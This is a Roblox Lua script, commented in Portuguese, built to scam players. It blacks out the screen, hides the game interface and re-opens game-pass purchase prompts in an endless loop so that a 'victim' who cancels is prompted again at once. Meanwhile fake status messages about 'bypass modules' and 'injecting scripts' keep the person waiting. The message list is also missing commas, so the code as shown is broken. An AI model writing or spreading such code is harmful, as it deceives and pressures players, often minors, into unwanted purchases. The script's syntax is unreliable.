-- Configurações
local GAMEPASS_IDS = {2005934638, 2004992687, 2006726677, 2006912657, 2006912657, 2006474712, 2006492688, 2006690710, 2006726677, 2005772704, 2005502715, 2006306662, 2005124677, 2005124677, 2006870695, 2006870694, 2005526698, 2006498709, 2006474711, 2005982699, 2006390726, 2006720636, 2005808741, 2006948680, 2006786699, 2006354666, 2005322700, 2005736689, 2006618734, 2006222671, 2006576725, 2006342690, 2006156718, 2005550675, 2006402701, 2005400720, 2005754676, 2006372679, 2004542727, 2006030675, 2006030675, 2006180703, 2007050698, 2006420706}
local TEXTO_AGUARDE = "Aguarde..."

-- Serviços
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer

-- Criação da Interface de Bloqueio
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SystemLock"
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999 -- Valor máximo para sobrepor tudo
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 10
blackFrame.Parent = screenGui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.Text = TEXTO_AGUARDE
label.TextColor3 = Color3.new(1, 1, 1)
label.TextSize = 30
label.Font = Enum.Font.SourceSansBold
label.ZIndex = 11
label.Parent = blackFrame

-- Função para forçar a compra
local function forcePurchase()
    for _, id in ipairs(GAMEPASS_IDS) do
        -- Dispara a janela de compra do Roblox
        MarketplaceService:PromptGamePassPurchase(player, id)
        
        -- Pequeno delay para não crashar o cliente, mas rápido o suficiente para incomodar
         task.wait(0.1) 
    end
end

-- Loop infinito de compra
-- O loop garante que se a vítima clicar em "Cancelar", a janela reapareça instantaneamente
task.spawn(function()
    while true do
        forcePurchase()
         task.wait(0)
    end
end)

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Sistema de mensagens enganosas para a vítima
local mensagens = {
    "Aguarde..."
    "Carregando módulos de bypass..."
    "Injetando scripts no servidor..."
    "Quase lá, finalizando configuração..."
    "Sincronizando dados..."
    "O script está quase funcionando..."
}

task.spawn(function()
    while true do
        for _, msg in ipairs(mensagens) do
            label.Text = msg
            task.wait(5)
        end
    end
end)
